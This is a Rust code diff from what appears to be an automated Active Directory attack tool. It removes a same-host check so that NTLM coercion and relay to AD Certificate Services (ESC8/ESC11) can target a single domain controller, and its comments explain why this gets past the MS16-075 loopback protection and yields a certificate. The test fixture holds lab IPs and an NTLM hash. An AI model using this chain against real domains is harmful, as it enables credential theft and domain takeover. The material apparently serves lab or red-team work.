@@ -819,17 +819,17 @@ fn parse_relay_coerce_args(args: &Value) -> Result<RelayCoerceConfig> {
     let coerce_password = optional_str(args, "coerce_password").filter(|s| !s.is_empty());
     let template = optional_str(args, "template").unwrap_or("DomainController");
 
-    // Source ≠ target. Coercing the CA host itself triggers same-machine
-    // NTLM loopback rejection at IIS. Conservative literal compare — callers
-    // mixing hostname/IP across the two args still slip through, that's their
-    // problem to keep distinct.
-    if coerce_target == ca_host {
-        anyhow::bail!(
-            "relay_and_coerce: coerce_target ({coerce_target}) must differ from ca_host \
-             ({ca_host}); same-machine NTLM loopback protection blocks relayed auth. \
-             Coerce a different machine account (e.g. another DC) and relay it to this CA."
-        );
-    }
+    // Same-host coerce + relay used to be rejected here on loopback grounds.
+    // That's only true for SMB→SMB / HTTP→SMB relay; the loopback check
+    // (MS16-075 / KB5005413) keys on the inbound auth protocol matching the
+    // outbound relay protocol on the same target. ESC8/ESC11 default to
+    // SMB→HTTP (web enrollment) and the equivalent SMB→RPC (ICPR), and IIS
+    // does not refuse a relayed NTLM auth that comes back to itself from a
+    // different protocol. Empirically the same-host chain captures a valid
+    // PFX in production lab runs against winterfell/contoso. Keeping the
+    // self-coerce as a last-tier candidate gives the orchestrator a fallback
+    // when no foreign DC is reachable for cross-host coercion — without it,
+    // a single-DC forest with ESC8 was unreachable through the auto chain.
 
     if coerce_user.is_some() && coerce_hash.is_none() && coerce_password.is_none() {
         anyhow::bail!(
@@ -2030,8 +2030,14 @@ mod tests {
         assert!(err.contains("forbidden"));
     }
 
-    #[tokio::test]
-    async fn relay_and_coerce_rejects_same_host() {
+    #[test]
+    fn parse_relay_coerce_args_accepts_same_host_for_smb_to_http() {
+        // Self-coerce (ca_host == coerce_target) is intentionally permitted
+        // now. ESC8/ESC11 default to SMB→HTTP / SMB→RPC relay and MS16-075's
+        // same-machine NTLM loopback rejection only fires when the inbound
+        // and outbound auth protocols match on the same host. SMB→HTTP does
+        // not trip the check and same-host coerce-relay reliably yields a
+        // PFX in single-DC topologies where no foreign coerce target exists.
         let args = json!({
             "ca_host": "192.168.58.10",
             "coerce_target": "192.168.58.10",
@@ -2040,8 +2046,8 @@ mod tests {
             "coerce_hash": "b8d76e56e9dac90539aff05e3ccb1755",
             "coerce_domain": "contoso.local"
         });
-        let err = relay_and_coerce(&args).await.unwrap_err().to_string();
-        assert!(err.contains("must differ") || err.contains("loopback"));
+        let cfg = super::parse_relay_coerce_args(&args).expect("self-coerce must parse");
+        assert_eq!(cfg.ca_host, cfg.coerce_target);
     }
 
     #[test]
